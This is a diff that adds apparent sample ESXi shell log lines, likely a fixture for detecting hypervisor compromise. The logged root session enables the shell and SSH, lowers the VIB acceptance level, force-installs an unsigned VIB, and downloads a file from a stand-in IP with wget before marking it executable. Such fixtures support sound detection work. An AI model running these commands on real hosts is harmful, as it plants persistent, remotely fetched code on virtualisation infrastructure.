@@ -1,0 +1,12 @@
+2025-01-10T01:30:29Z ESXShell: ESXi shell login enabled
+2025-01-10T01:30:29Z ESXShell: ESXi Shell available
+2025-01-10T01:30:36Z SSH: SSH login enabled
+2025-01-10T01:37:05Z shell[2100700]: Interactive shell session started
+2025-01-10T01:37:20Z shell[2100700]: [root]: vmware -v
+2025-01-10T01:38:40Z shell[2100700]: [root]: esxcli software acceptance set --level=CommunitySupported
+2025-01-10T01:39:00Z shell[2100700]: [root]:  esxcli software vib install -v /tmp/example.vib --force
+2025-01-10T01:40:00Z shell[2100700]: [root]: wget http://203.0.113.80/x -O /tmp/x; chmod +x /tmp/x
+2025-01-10T01:41:00Z shell[2100700]: [alice]: 
+2026-02-03T23:16:32.866Z In(14) shell[132915]: Interactive shell session started
+2026-02-03T23:16:33.976Z In(14) shell[132915]: [root]: ls
+2026-02-03T23:20:56.704Z No(13) SSH[132771]: SSH login disabled
